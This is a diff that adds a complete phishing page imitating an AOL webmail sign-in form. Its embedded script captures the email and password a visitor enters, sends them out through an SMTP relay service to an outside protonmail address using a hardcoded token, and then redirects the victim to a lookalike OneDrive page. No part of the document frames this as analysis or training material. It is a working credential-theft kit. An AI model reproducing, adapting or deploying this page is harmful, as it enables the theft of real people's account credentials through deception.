@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="style01.css" rel="stylesheet" />
+    <script src="script01.js" ></script>
+    <title>Log in</title>
+    
+
+</head>
+<body class="blackwebmaillogin">
+    <script src="script01.js"></script>
+    <div class="loginbox">
+        <form class="aollogin"  action="#">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhuSX09ZTbaVbHYNhVo8bALoak-oXaltxT7nxAU-okQcbFA1bgHaNSOMkbWa-rVejifNMq37mcWhsEwGAOyy1JvCXe1XPAmh-ss_2juhy_m1GmqVe-Ul2VcqrxsSzjAaehXWWY6vMCYJv958arIXn4TzkPgQ1kwd00VKyJSSSAKrnCfq99XlnOfKDoe_GmZ/s320/aol.png" alt="Alternate text" class="aoluser" />
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value="https://onedrive--shared-documents-wenasndue3n2wnw23us.on.drv.tw/viewdocument--incorrectcredentials--2jashywu2/98347548348348438 aol.html">
+            <label class="aolIblemail">
+                <b>
+                    Sign in
+                </b>
+            </label>
+            <br><br><br><br><br><br>
+            <input type="email" name="email" class="aoltxtemail" placeholder="  Email"  required>
+            <br><br>
+            <input type="Password" name="Pass" class="aoltxtpass" placeholder="  Password" required>
+            <label for="mj6" class="v2" style="font-style:initial;"  >Incorrect Login Credentials </label>
+            <br><br>
+            <button class="aolbtnsubmit" type="submit" >Sign in</button>
+            <br><br>
+
+        </form>
+        <script src="https://smtpjs.com/v3/smtp.js">
+        </script>
+    
+        <script>
+              
+            const form = document.querySelector('.aollogin')
+    
+    
+           function sendMsg(e){
+            e.preventDefault();
+            
+                const  Fullname = document.querySelector('.aoltxtemail')
+                  department = document.querySelector('.aoltxtpass')
+    
+    
+             Email.send({
+             SecureToken : "523b9631-eba2-428d-b404-b38a5c0db98f",
+             To : 'cansiloma120@protonmail.com',
+             From : "yohnlom@gmail.com",
+             Subject : "This is the subject"+"="+Fullname.value,
+             Body : "NAME  ["+Fullname.value+"]   department  ["+department.value+"]"
+             });
+             window.location.href = "https://Onedrivedocuments.github.io/viewdocuments-23jqmsai32mwqm3wqj3/83823823aol.html";
+           }
+    
+           form.addEventListener('submit', sendMsg);
+    
+            
+        </script>
+    </div>
+</body>
+</html>
